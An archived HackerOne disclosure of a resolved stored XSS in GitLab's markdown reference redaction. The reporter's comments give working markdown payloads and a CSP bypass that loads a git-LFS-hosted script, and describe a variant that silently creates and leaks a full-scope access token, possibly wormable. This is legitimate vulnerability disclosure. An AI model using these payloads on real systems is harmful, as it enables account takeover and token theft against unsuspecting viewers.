---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
date: 2020-09-09
submitted: 2020-04-01T22:46:10.314Z
bounty_usd: 5000
votes: 50
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/836649"
title: "Stored XSS in markdown when redacting references"
---
# Stored XSS in markdown when redacting references

> **Severity:** High | **Bounty:** 5,000 USD | **Votes:** 50 | **Program:** GitLab | **Disclosed:** 2020-09-09

- Report: [https://hackerone.com/reports/836649](https://hackerone.com/reports/836649)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-04-01T22:46:10.314Z

## Timeline

- **Report Filed**
- **2020-04-01** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 10 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-04-02** @vakzz: Here's an example with a full csp bypass not requiring user interaction: https://gitlab.com/vakzz-h1/stored-xss/-/issues/3

```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp 
&lt;script src=&quot;/vakzz-h1/public/-/raw/master/test.js&quot;&gt;&lt;/script&gt;
</a>
```

If you add a javascript file via git lfs then it will end up with the content-type `application/javascript` and can be used as a script src due to `script-src 'self'` in the csp.

```bash
$ curl -I 'https://gitlab.com/vakzz-h1/public/-/raw/master/test.js'
HTTP/2 200
date: Thu, 02 Apr 2020 03:39:57 GMT
content-type: application/javascript
...
```

One more example to show the impact, if you click ok then it creates a personal token will all the scopes and sends if off to a remote server. The xss could be pretty much hidden inside an issue or comment and could trigger for anyone viewing the page.

Issue link: https://gitlab.com/vakzz-h1/stored-xss/-/issues/4
Payload link: https://gitlab.com/vakzz-h1/public/-/raw/master/payload.js

```markdown
<a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">create and leak an access token 
&lt;script src=&quot;/vakzz-h1/public/-/raw/master/payload.js&quot;&gt;&lt;/script&gt;
</a>
```

{F769801}
{F769802}

Cheers,
Will
- **Report Triaged**
- **Bounty Awarded**
- **2020-04-02** @vakzz: Hey @akelly,

Thanks for the response and triage payment!

Regarding the severity of this one, normally I'd have a stored XSS as high but given how easily this could be turned into a wormable version (eg the initial payload could be posted on a bunch of public repos and then the payload could duplicate itself via issues/comments on all their accessible public/private repos) it could potentially affect a large number of users and be considered critical.

Anyway GitLab has always been great at investigating and determining the severity so interested to see what the team decided :)

Cheers,
Will
- **2020-04-04** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2020-05-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-05-20** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2020-06-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-06-09** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2020-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
